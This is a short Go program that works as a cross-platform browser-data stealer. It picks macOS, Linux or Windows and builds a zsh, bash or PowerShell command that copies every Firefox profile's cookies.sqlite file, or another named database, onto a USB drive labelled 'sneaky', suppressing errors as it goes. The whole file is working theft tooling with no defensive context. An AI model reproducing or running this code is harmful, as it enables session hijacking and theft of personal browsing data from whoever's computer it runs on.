package main

import (
	"fmt"
	"os"
	"os/user"
	"os/exec"
	"runtime"
)


func main() {

	usr, usrErr := user.Current()
	if usrErr != nil {
		fmt.Println(usrErr)
	}

	var file, cmdStart, cmdString string
	var isUnix bool

	if len(os.Args) > 1 {
		file = os.Args[1]
	} else {
		file = "cookies"
	}

	switch os := runtime.GOOS; os {
	case "darwin":
		fmt.Println("macOS")
		cmdStart = "zsh"
		cmdString = "counter=0 && for dir in \"/Users/$(users)/Library/Application Support/Firefox/Profiles/\"* ; do cp -r $dir/" + file + ".sqlite /Volumes/sneaky/" + file + "$counter.sqlite 2>/dev/null ; ((counter=counter+1)) ; done"
		isUnix = true
		
	case "linux":
		fmt.Println("Linux")
		cmdStart = "bash"
		path := usr.HomeDir + "/.mozilla/firefox/*/"
		cmdString = "counter=0 && for dir in " + path + " ; do if [[ $dir != *'Crash'* && $dir != *'Pending'* ]]; then cp -r $dir/" + file  + ".sqlite /media/$(users)/sneaky/" + file + "$counter.sqlite 2>/dev/null ; ((counter=counter+1)); fi ; done"
		isUnix = true

	case "windows":
		fmt.Println("Windows")
		cmdStart = "powershell.exe"
		path := usr.HomeDir + "/AppData/Roaming/Mozilla/Firefox/Profiles"
		cmdString = "$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select -expand name ; $counter = 0 ; Get-ChildItem -Path " + path + " | Foreach-Object { cp (Join-Path $_.FullName '" + file + ".sqlite') $usbPath'" + file + "'$counter'.sqlite' ; $counter++ }"

	default:
		return
	}
	
	cmd := exec.Command("")
	if isUnix {
		cmd = exec.Command(cmdStart, "-c", cmdString)
	} else {
		cmd = exec.Command(cmdStart, cmdString)
	}
    err := cmd.Run()
    if err != nil {
		fmt.Printf("cmd.Run() failed with %s\n", err)
    }

}
